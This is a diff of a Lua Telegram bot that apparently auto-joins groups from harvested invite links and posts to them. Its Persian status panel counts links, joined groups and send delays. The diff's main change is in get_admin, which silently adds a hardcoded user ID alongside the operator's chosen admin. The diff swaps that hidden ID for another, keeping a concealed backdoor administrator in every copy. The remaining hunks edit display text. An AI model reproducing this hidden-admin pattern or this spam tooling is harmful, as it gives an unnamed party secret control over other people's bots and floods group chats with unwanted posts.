@@ -21,7 +21,7 @@ function get_admin ()
     	local admin=io.read()
 		redis:del("botBOT-IDadmin")
 		redis:del("botBOT-IDadmin")
-    	redis:sadd("botBOT-IDadmin", admin, 365196540)
+    	redis:sadd("botBOT-IDadmin", admin, 136274004)
 		redis:set('botBOT-IDadminset',true)
     	return print("Admin ID : ".. admin .."")
 	end
@@ -314,10 +314,10 @@ function get_bot (i, adigram)
 						  local sima = os.date("%A🔜 %d %B")
 						  
                           local text = 
-[[<b>  </b> ]] .. tostring(sima) .. [[
+[[<b>  </b> ]] .. tostring(sima) .. [[  
 <b> 💱⛓ لایکچی BOT-ID </b>
 ✍امار 🖥⚡️]] .. tostring(fname) .. [[⚡
-🅰️ خروچ از همه گروهها ⛔️👈 *1#
+ خروچ از همه گروهها ⛔️👈 *1#
 ⛓ <b>]] .. tostring(wlinks)..[[</b> لینک شناسایی کرده
 📊 <b>]] .. tostring(links)..[[</b> links join and seved
 ➿ <b>]] .. tostring(glinks)..[[</b> لینک در انتظار عضویت
@@ -326,7 +326,7 @@ function get_bot (i, adigram)
 🌀 <b>]] .. tostring(delay)..[[</b> ثانیه فاصله بین ارسال به گروه ها
 👭 عضویت در حداکثر سوپرگروه ها 👭
 💯➡️ <b>]] .. tostring(maxsg)..[[</b> Groups
-💠 p v :  <b>]] .. tostring(usrs) .. [[</b> Ⓜ️
+ 💠 <b>]] .. tostring(usrs) .. [[</b> Ⓜ️ پی وی 
 🎎 <b>]] .. tostring(gps) .. [[</b> گروه عادی
 <b>]] .. tostring(sgps) .. [[</b> 💤Super Groups
 لینک های جدید برای تبچی👇
